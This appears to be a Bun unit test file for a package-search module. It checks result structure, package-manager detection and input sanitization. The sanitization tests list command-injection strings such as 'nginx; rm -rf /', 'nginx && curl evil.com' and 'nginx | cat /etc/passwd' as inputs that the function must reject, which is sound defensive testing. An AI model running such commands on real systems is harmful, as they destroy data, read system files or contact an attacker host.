import { describe, test, expect, mock } from 'bun:test';
import { searchPackages, detectPackageManagers } from './package-search';

describe('package-search', () => {
  describe('searchPackages', () => {
    test('should search packages and return results', async () => {
      // This test requires mocking the actual shell commands
      // For now, we'll test with a valid query format
      const packages = await searchPackages('nginx');

      // Results depend on system, so we just verify structure
      expect(Array.isArray(packages)).toBe(true);
      packages.forEach((pkg) => {
        expect(pkg).toHaveProperty('name');
        expect(pkg).toHaveProperty('source');
        expect(pkg).toHaveProperty('isDefault');
        expect(['apt', 'yum', 'dnf', 'choco', 'pip', 'npm', 'gem']).toContain(pkg.source);
      });
    });

    test('should reject invalid queries with special characters', async () => {
      const invalidQueries = [
        'nginx; rm -rf /',
        'nginx && curl evil.com',
        'nginx | cat /etc/passwd',
        'nginx$(whoami)',
        'nginx`whoami`',
        'nginx > /tmp/evil',
        'nginx < /etc/passwd',
        'nginx (test)',
        'nginx\nwhoami',
      ];

      for (const query of invalidQueries) {
        const packages = await searchPackages(query);
        expect(packages).toEqual([]);
      }
    });

    test('should accept valid queries', async () => {
      const validQueries = ['nginx', 'nginx-full', 'postgresql-12', 'python3'];

      for (const query of validQueries) {
        const packages = await searchPackages(query);
        // Should not throw or return error
        expect(Array.isArray(packages)).toBe(true);
      }
    });

    test('should mark first package from each manager as default', async () => {
      const packages = await searchPackages('nginx');

      const managerDefaults = new Map<string, boolean>();
      for (const pkg of packages) {
        if (!managerDefaults.has(pkg.source)) {
          managerDefaults.set(pkg.source, pkg.isDefault);
        }
      }

      // First package from each manager should be default
      for (const [manager, isDefault] of managerDefaults) {
        const firstFromManager = packages.find((p) => p.source === manager);
        if (firstFromManager) {
          expect(firstFromManager.isDefault).toBe(true);
        }
      }
    });

    test('should handle timeout gracefully', async () => {
      // Simulate a slow query that would timeout
      const packages = await searchPackages('nginx', { timeout: 1 });
      expect(Array.isArray(packages)).toBe(true);
    });

    test('should limit results to max', async () => {
      const packages = await searchPackages('nginx', { maxResults: 3 });
      expect(packages.length).toBeLessThanOrEqual(3);
    });
  });

  describe('detectPackageManagers', () => {
    test('should detect available package managers', async () => {
      const managers = await detectPackageManagers();

      expect(typeof managers).toBe('object');
      expect(managers).toHaveProperty('apt');
      expect(managers).toHaveProperty('yum');
      expect(managers).toHaveProperty('dnf');
      expect(managers).toHaveProperty('choco');
      expect(typeof managers.apt).toBe('boolean');
      expect(typeof managers.yum).toBe('boolean');
      expect(typeof managers.dnf).toBe('boolean');
      expect(typeof managers.choco).toBe('boolean');
    });

    test('should return object with boolean values', async () => {
      const managers = await detectPackageManagers();
      // On macOS (dev environment), might not have any Linux package managers
      // But the function should return an object with boolean values
      expect(typeof managers).toBe('object');
      expect(Object.values(managers).every((v) => typeof v === 'boolean')).toBe(true);
    });
  });

  describe('sanitization', () => {
    test('should reject queries with semicolons', async () => {
      const packages = await searchPackages('test;echo bad');
      expect(packages).toEqual([]);
    });

    test('should reject queries with pipes', async () => {
      const packages = await searchPackages('test|grep pattern');
      expect(packages).toEqual([]);
    });

    test('should reject queries with ampersands', async () => {
      const packages = await searchPackages('test&& malicious');
      expect(packages).toEqual([]);
    });

    test('should reject queries with dollar signs', async () => {
      const packages = await searchPackages('test$(command)');
      expect(packages).toEqual([]);
    });

    test('should reject queries with backticks', async () => {
      const packages = await searchPackages('test`command`');
      expect(packages).toEqual([]);
    });

    test('should reject queries with parentheses', async () => {
      const packages = await searchPackages('test(sub)');
      expect(packages).toEqual([]);
    });

    test('should reject queries with redirects', async () => {
      const packages1 = await searchPackages('test > file');
      const packages2 = await searchPackages('test < file');
      expect(packages1).toEqual([]);
      expect(packages2).toEqual([]);
    });

    test('should reject queries with newlines', async () => {
      const packages = await searchPackages('test\nmalicious');
      expect(packages).toEqual([]);
    });

    test('should accept alphanumeric with dashes and underscores', async () => {
      const validQueries = ['nginx', 'nginx-full', 'postgresql_12', 'python3-dev', 'my_package-2'];

      for (const query of validQueries) {
        const packages = await searchPackages(query);
        expect(Array.isArray(packages)).toBe(true);
      }
    });
  });
});
